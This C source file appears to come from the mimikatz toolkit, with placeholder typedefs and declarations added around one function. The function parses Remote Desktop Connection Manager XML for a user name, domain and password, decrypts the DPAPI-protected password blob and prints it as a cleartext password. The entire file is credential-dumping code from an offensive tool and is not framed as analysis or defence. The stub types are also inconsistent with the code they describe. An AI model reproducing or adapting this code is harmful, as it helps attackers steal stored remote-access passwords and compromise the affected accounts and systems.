
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int wchar_t ;
typedef scalar_t__ PBYTE ;
typedef int * LPVOID ;
typedef int * LPBYTE ;
typedef int IXMLDOMNode ;
typedef int GUID ;
typedef int DWORD ;


 scalar_t__ IXMLDOMNode_selectSingleNode (int *,char*,int **) ;
 int KULL_M_DPAPI_GUID_PROVIDER ;
 int LocalFree (int *) ;
 int PRINT_ERROR (char*,...) ;
 scalar_t__ RtlEqualGuid (scalar_t__,int *) ;
 scalar_t__ S_OK ;
 int kprintf (char*,int,char*,int,int *,...) ;
 scalar_t__ kuhl_m_dpapi_unprotect_raw_or_blob (int *,int,int *,int,int **,int *,int ,int **,int*,int *) ;
 scalar_t__ kull_m_string_quick_base64_to_Binary (int *,int **,int*) ;
 int * kull_m_xml_getTextValue (int *,char*) ;

void kuhl_m_dpapi_rdg_LogonCredentials(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[])
{
 IXMLDOMNode *pLogonCredentialsNode;
 wchar_t *userName, *domain, *password;
 LPBYTE data;
 LPVOID pDataOut;
 DWORD szData, dwDataOutLen;

 if((IXMLDOMNode_selectSingleNode(pNode, L"logonCredentials", &pLogonCredentialsNode) == S_OK) && pLogonCredentialsNode)
 {
  if(userName = kull_m_xml_getTextValue(pLogonCredentialsNode, L"userName"))
  {
   if(domain = kull_m_xml_getTextValue(pLogonCredentialsNode, L"domain"))
   {
    if(password = kull_m_xml_getTextValue(pLogonCredentialsNode, L"password"))
    {
     kprintf(L"%*s" L"* %s \\ %s : %s\n", level << 1, L"", domain, userName, password);
     if(kull_m_string_quick_base64_to_Binary(password, &data, &szData))
     {
      if(szData >= (sizeof(DWORD) + sizeof(GUID)))
      {
       if(RtlEqualGuid((PBYTE) data + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER))
       {
        if(kuhl_m_dpapi_unprotect_raw_or_blob(data, szData, ((void*)0), argc, argv, ((void*)0), 0, &pDataOut, &dwDataOutLen, ((void*)0)))
        {
         kprintf(L"%*s" L">> cleartext password: %.*s\n", level << 1, L"", dwDataOutLen / sizeof(wchar_t), pDataOut);
         LocalFree(pDataOut);
        }
       }
       else PRINT_ERROR(L"Maybe certificate encryption (todo)\n");
      }
      else PRINT_ERROR(L"szData: %u\n", szData);
      LocalFree(data);
     }
     LocalFree(password);
    }
    LocalFree(domain);
   }
   LocalFree(userName);
  }
 }
}
